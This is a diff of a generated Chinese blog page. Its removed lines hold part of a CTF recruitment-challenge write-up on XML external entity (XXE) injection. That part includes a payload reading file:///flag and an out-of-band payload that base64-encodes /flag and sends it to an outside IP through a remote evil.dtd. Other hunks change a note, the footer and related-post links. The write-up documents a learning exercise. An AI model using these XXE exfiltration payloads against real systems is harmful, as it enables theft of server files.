-</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY d1 SYSTEM &#34;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&#34;&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="继续题目">继续题目
-</h3><h4 id="尝试直接引入外部实体">尝试直接引入外部实体：
-</h4><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [ 
-</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY rabbit SYSTEM &#34;file:///flag&#34; &gt;</span>
-</span></span><span class="line"><span class="cl">]&gt;
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;&lt;username&gt;</span><span class="ni">&amp;rabbit;</span><span class="nt">&lt;/username&gt;&lt;/user&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>响应：</p>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251015210748834.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20251015210748834"
-	
-	
-></p>
-<p>为什么不行？</p>
-<h4 id="尝试引入服务器外部实体外带">尝试引入服务器外部实体、外带：
-</h4><p>payload：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!DOCTYPE hacker[
-</span></span><span class="line"><span class="cl">    &lt;!ENTITY  % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/flag&#34;&gt;
-</span></span><span class="line"><span class="cl">    &lt;!ENTITY  % myurl SYSTEM &#34;http://8.137.145.223/evil.dtd&#34;&gt;
-</span></span><span class="line"><span class="cl">    %myurl;
-</span></span><span class="line"><span class="cl">]&gt; 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>evil.dtd：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY % wrapper &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://8.137.145.223/?x=%file;&#39;&gt;&#34;&gt;
-</span></span><span class="line"><span class="cl">%wrapper;
-</span></span><span class="line"><span class="cl">%send;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>python3 -m http.server 8000</p>
-<p>测试外网可以正常访问，改包重发：</p>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251015212035894.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20251015212035894"
-	
-	
-></p>
-<p>还是不行，为什么？</p>
-<h2 id="解决">解决
-</h2><p>最后发现问题在于，默认访问的是 80 端口！！！而启动服务器的时候启动了 8000……</p>
-<p>服务器：</p>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251016091110199.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20251016091110199"
-	
-	
-></p>
-<p>bp:</p>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251016091143580.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20251016091143580"
-	
-	
-></p>
-<p>终于！！</p>
-<h3 id="一些启示">一些启示
-</h3><ol>
-<li>先搜集信息定方向，然后具体学习相关知识</li>
-<li>总是有一些奇怪的错误，定位到知识上去解决，不要乱试</li>
-</ol>
+<blockquote>
+<p>又发现 .txt 中没有换行，得添加一下手动换行</p>
+</blockquote>
 
 </section>
 
@@ -590,19 +616,7 @@
 
         <span>Licensed under Calendar</span>
     </section>
-    <section class="article-lastmod">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
-</svg>
-
-
-
-        <span>
-            最后更新于 Oct 16, 2025 00:00 UTC
-        </span>
-    </section></footer>
+    </footer>
 
 
     
@@ -616,19 +630,6 @@
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
-            
-                
-<article class="">
-    <a href="/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">御林招新题：shell 入门</h2>
-        </div>
-    </a>
-</article>
-
             
                 
 <article class="">
@@ -651,6 +652,19 @@
 
         <div class="article-details">
             <h2 class="article-title">御林招新题：DevOps-Linux入门</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：雪王生擒明珠塔</h2>
         </div>
     </a>
 </article>
